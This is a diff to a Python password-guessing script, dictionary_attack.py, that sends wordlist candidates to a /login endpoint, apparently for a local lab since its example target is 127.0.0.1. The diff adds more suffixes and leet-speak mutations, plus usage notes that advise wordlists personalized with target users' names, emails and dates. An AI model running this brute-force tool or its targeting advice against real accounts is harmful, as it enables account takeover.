@@ -1,9 +1,17 @@
 #!/usr/bin/env python3
 """
-Dictionary-based brute-force tool with simple mutations.
-
-Reads a wordlist (one word per line), applies mutations (suffixes and character substitutions),
-and tests each candidate against the target /login endpoint.
+================================================================================
+File:        dictionary_attack.py
+Description: Dictionary-based brute-force attack with word mutations
+             Uses wordlist with character substitutions and common suffixes
+             to generate password candidates
+Parameters:  --target <URL>, --user <username>, --list <wordlist_path>,
+             --delay <float>
+Author:      Erik Buser
+Date:        2025-10-28
+Note:        Wordlist should include common passwords AND personalized entries
+             (names, emails, dates, combinations) for target users
+================================================================================
 """
 
 import argparse
@@ -23,24 +31,27 @@ def load_wordlist(path):
 
 
 def mutate_word(word):
-    """Generate simple mutations of a word.
+    """Generate mutations of a word with common patterns.
     
     Returns list of candidates including:
-      - Original word with suffixes ['', '1', '123']
-      - Character substitutions o->0, a->@, i->1 with suffixes
+      - Original word with suffixes ['', '1', '123', '!', '@', '2024', '2025']
+      - Character substitutions (leet speak): o->0, a->@, i->1, e->3, s->$
+      - Capitalization variants
     """
     candidates = []
-    suffixes = ["", "1", "123"]
+    suffixes = ["", "1", "123", "!", "@", "2024", "2025"]
     
     # Add original word with suffixes
     for suffix in suffixes:
         candidates.append(word + suffix)
     
-    # Apply character replacements
+    # Apply leet speak character replacements
     mutated = word
     mutated = mutated.replace("o", "0").replace("O", "0")
     mutated = mutated.replace("a", "@").replace("A", "@")
     mutated = mutated.replace("i", "1").replace("I", "1")
+    mutated = mutated.replace("e", "3").replace("E", "3")
+    mutated = mutated.replace("s", "$").replace("S", "$")
     
     # Only add mutated variants if different from original
     if mutated != word:
@@ -68,7 +79,18 @@ def try_post(url, payload, timeout=5.0, max_retries=3):
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Dictionary-based brute-force tool")
+    parser = argparse.ArgumentParser(
+        description="Dictionary-based brute-force tool with word mutations",
+        epilog="""
+Example:
+  python dictionary_attack.py --target http://127.0.0.1:5000/login \\
+    --user alice --list db/wordlists/common-passwords.txt
+  
+Note: 
+  The wordlist should contain both common passwords AND personalized entries
+  for your target users (names, email parts, dates, combinations).
+        """
+    )
     parser.add_argument("--target", required=True, help="Target URL (e.g. http://127.0.0.1:5000/login)")
     parser.add_argument("--user", required=True, help="Username to test")
     parser.add_argument("--list", required=True, help="Path to wordlist file (one word per line)")
@@ -76,7 +98,11 @@ def main():
     args = parser.parse_args()
 
     words = load_wordlist(args.list)
+    print("=" * 70)
+    print("DICTIONARY ATTACK")
+    print("=" * 70)
     print(f"[+] Loaded {len(words)} words from {args.list}")
+    print()
 
     tried = 0
     start = time.time()
@@ -95,7 +121,11 @@ def main():
                 else:
                     if r.status_code == 200:
                         elapsed = time.time() - start
-                        print(f"FOUND: {candidate} (tried {tried} candidates in {elapsed:.1f}s)")
+                        print()
+                        print("=" * 70)
+                        print(f"SUCCESS! Password found: {candidate}")
+                        print(f"Tried {tried} candidates in {elapsed:.1f}s")
+                        print("=" * 70)
                         return 0
                     else:
                         if tried % 50 == 0:
@@ -108,7 +138,11 @@ def main():
         print("\n[!] Interrupted by user")
         return 130
 
-    print(f"Not found (tried {tried} candidates)")
+    elapsed = time.time() - start
+    print()
+    print("=" * 70)
+    print(f"NOT FOUND: Tried {tried} candidates in {elapsed:.1f}s")
+    print("=" * 70)
     return 1
 
 
